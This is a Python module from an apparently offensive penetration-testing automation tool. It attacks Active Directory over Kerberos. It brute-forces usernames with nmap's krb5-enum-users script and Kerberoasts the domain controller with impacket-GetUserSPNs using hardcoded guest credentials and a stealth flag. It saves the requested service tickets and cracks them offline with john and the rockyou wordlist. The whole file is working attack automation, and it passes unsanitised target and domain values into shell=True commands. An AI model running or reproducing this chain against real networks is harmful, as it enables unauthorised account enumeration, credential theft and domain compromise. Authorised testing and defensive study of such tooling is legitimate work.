from mods.mod_utils import *
import subprocess
import os

def handle_kerberos(target, domain):
    # Try to bruteforce Usernames
    enum_users(target, domain)
    # Check Kerberoast using guest creds
    check_kerberoast(target, domain)
    

def enum_users(target, domain):
    filename = '/usr/share/seclists/Usernames/Names/names.txt'
    cmd = f'nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="{domain}",userdb="{filename}" {target}'
    output = None
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)

        if output:
            if ('Discovered' in output):
                print_banner('88')
                print('[!] KERBEROS')
                print(f'[!] {cmd}')
                printc('[+] Some usernames where found.', GREEN)
                for line in output.splitlines():
                    if domain in line:
                        user = line.split('@')[0].split(' ')[-1]
                        printc(user, BLUE)
    except Exception as e:
        if not os.path.exists(filename):
            print(f'[-] {filename} does not exist.\nPlease install seclists.')
        printc(f'[-] {e}', RED)
    

def check_kerberoast(target, domain, user='ybob317', passw='ybob317'):
    cmd = f'impacket-GetUserSPNs {domain}/{user}:{passw} -dc-ip {target} -stealth'

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)

        if output:
            if ('ServicePrincipalName' in output):
                print_banner('88')
                print('[!] KERBEROS')
                print(f'[!] {cmd}')
                printc(f'[+] Some Kerberoastable users where found with the credentials "{user}:{passw}"', GREEN)
                for line in output.splitlines():
                    passw_last_set = re.findall('....-..-..\s.*:.*:.*\.', line)
                    if passw_last_set:
                        re_user = re.findall('.+\s(\w+)\s', line)
                        if re_user: 
                            kerberoastable_user = re_user[0]
                            printc(f'[+] {kerberoastable_user}', BLUE)
                cmd = f'impacket-GetUserSPNs {domain}/{user}:{passw} -dc-ip {target} -stealth -request -output tickets.txt'
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)

                print_separator()
                print('[!] Requesting tickets.')
                print(f'[!] {cmd}')
                if ('KRB_AP_ERR_SKEW' in output):
                    printc('[-] Requesting tickets failed.', RED)
                    print('[!] Trying to Synchronize TIME with server.')
                    time_cmd = f'sntp -sS {target}' 
                    print(f'[!] {time_cmd}')
                    output = subprocess.check_output(time_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                    if not output:
                        printc('[-] Synchronize failed.', RED)
                        return
                    printc('[+] Synchronize Success.', GREEN)
                    subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                if os.path.exists('tickets.txt'):
                    printc('[+] Tickets stored in tickets.txt', GREEN)
                    crack = ''
                    while (crack == ''):
                        crack = input("Would you like to crack them now Y/N")
                    if (crack.upper() != 'Y'):
                        print_cracking_cmd()
                        return
                    try:
                        if not os.path.exists('/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt'):
                            if os.path.exists('/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz'):
                                unzip_cmd = 'tar -xzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz'
                                print(f'[!] {unzip_cmd}')
                                subprocess.check_output(unzip_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                                mv_cmd = 'mv rockyou.txt /usr/share/seclists/Passwords/Leaked-Databases/'
                                subprocess.check_output(mv_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                        if os.path.exists('/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt'):
                            print('[!] Trying to crack the tickets.')
                            john_cmd = 'john tickets.txt -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules=best64'
                            print(f'[!] {john_cmd}')
                            output = subprocess.check_output(john_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                            if output:
                                printc('[+] Tickets cracked successfully.', GREEN)
                                print(output)
                        return
                    except Exception as e:
                        printc(f'[-] {e}', RED)
                print_cracking_cmd()
    except Exception as e:
        printc(f'[-] {e}', RED)
        
    
def print_cracking_cmd():
    print('[!] To crack the tickets you can use john.')
    print('[!] john tickets.txt -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules=best64')
    print('[!] If the command does not work, unzip the rockyou.txt wordlist first')